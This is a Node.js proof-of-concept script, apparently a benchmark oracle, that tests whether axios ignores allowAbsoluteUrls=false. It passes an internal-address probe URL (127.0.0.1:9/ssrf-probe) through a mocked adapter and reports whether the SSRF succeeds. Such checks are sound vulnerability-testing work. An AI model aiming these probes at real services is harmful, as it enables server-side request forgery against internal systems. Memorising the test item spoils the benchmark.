const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  const markerDir = path.join(os.tmpdir(), 'axios-ssrf-oracle-2-' + process.pid + '-' + Date.now());

  try {
    fs.mkdirSync(markerDir, { recursive: true });

    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    // Benign operation: normal relative URL with default allowAbsoluteUrls=true
    // should resolve against baseURL to an absolute URL.
    let benignConfig = null;
    try {
      await axios.get('/ok', {
        baseURL: 'http://example.com/base/',
        timeout: 200,
        adapter: async (config) => {
          benignConfig = config;
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      evidence = 'benign_exception=' + (e && e.message ? e.message : String(e));
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    const benignUrl = benignConfig && typeof benignConfig.url === 'string' ? benignConfig.url : '';
    if (!/^http:\/\/example\.com\/base\/ok$/.test(benignUrl)) {
      evidence = 'benign_unexpected_url=' + benignUrl;
      console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
      return;
    }

    operation_completed = true;

    // Malicious operation: absolute attacker URL with allowAbsoluteUrls=false.
    // Vulnerable versions keep attacker absolute URL.
    // Patched versions combine baseURL with supplied absolute URL string, yielding example.com host.
    let malConfig = null;
    let malErr = null;
    try {
      await axios.get('http://127.0.0.1:9/ssrf-probe', {
        baseURL: 'http://example.com/safe/',
        allowAbsoluteUrls: false,
        timeout: 200,
        adapter: async (config) => {
          malConfig = config;
          return {
            data: 'ok',
            status: 200,
            statusText: 'OK',
            headers: {},
            config,
            request: {}
          };
        }
      });
    } catch (e) {
      malErr = e;
    }

    if (malErr) {
      exploit_succeeded = false;
      evidence = 'malicious_rejected=' + (malErr && malErr.message ? malErr.message : String(malErr));
    } else {
      const malUrl = malConfig && typeof malConfig.url === 'string' ? malConfig.url : '';

      const vulnerable = /^http:\/\/127\.0\.0\.1:9\/ssrf-probe$/.test(malUrl);
      exploit_succeeded = vulnerable;

      evidence = 'benign_url=' + benignUrl + ';mal_url=' + malUrl + ';marker=' + markerDir;
    }

    try {
      fs.writeFileSync(path.join(markerDir, 'evidence.txt'), evidence, 'utf8');
    } catch (_) {}
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup_exception=' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
})();